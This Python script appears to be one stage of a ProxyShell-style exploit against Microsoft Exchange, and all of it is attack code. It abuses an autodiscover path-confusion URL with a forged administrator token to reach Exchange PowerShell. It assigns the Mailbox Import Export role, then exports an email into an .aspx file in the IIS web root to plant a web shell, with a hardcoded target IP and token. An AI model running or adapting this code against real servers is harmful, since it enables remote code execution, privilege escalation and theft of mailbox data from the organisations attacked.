from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
def exploit_stage4(target, auth_b64, alias_name, subject, fShell):
    
    wsman = WSMan(server=target, port=443,
    path='/autodiscover/autodiscover.json?@fucky0u.edu/Powershell?X-Rps-CAT=' + auth_b64 +'&Email=autodiscover/autodiscover.json%3F@fucky0u.edu', 
    ssl="true", 
    cert_validation=False)
   
    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        
        ps = PowerShell(pool)
        #ps.add_cmdlet("Get-User")
        ps.add_cmdlet("New-ManagementRoleAssignment")
        ps.add_parameter("Role", "Mailbox Import Export")
        ps.add_parameter("SecurityGroup", "Organization Management")
        output = ps.invoke()
        
    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        
       
        ps = PowerShell(pool)
        ps.add_cmdlet("New-MailboxExportRequest")
        ps.add_parameter("Mailbox", alias_name)
        ps.add_parameter("Name", subject)
        ps.add_parameter("ContentFilter", "Subject -eq '%s'" % (subject))
        ps.add_parameter("FilePath", "\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\%s" % fShell)
        output = ps.invoke()


target="192.168.152.111"
#token
auth_b64="VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBdhZG1pbmlzdHJhdG9yQHJ1eXVlLmNvbVUsUy0xLTUtMjEtMjk1NTg1OTg3My05MDgyNzE1OTItMTk3NTEyMTI1Ni01MDBHAQAAAAcAAAAMUy0xLTUtMzItNTQ0RQAAAAA="
#将谁的邮箱保存到本地
alias_name="administrator"
#哪封邮件
subject="aomenshoujiaxianshangduchang"
fShell="777777.aspx"
exploit_stage4(target, auth_b64, alias_name, subject, fShell)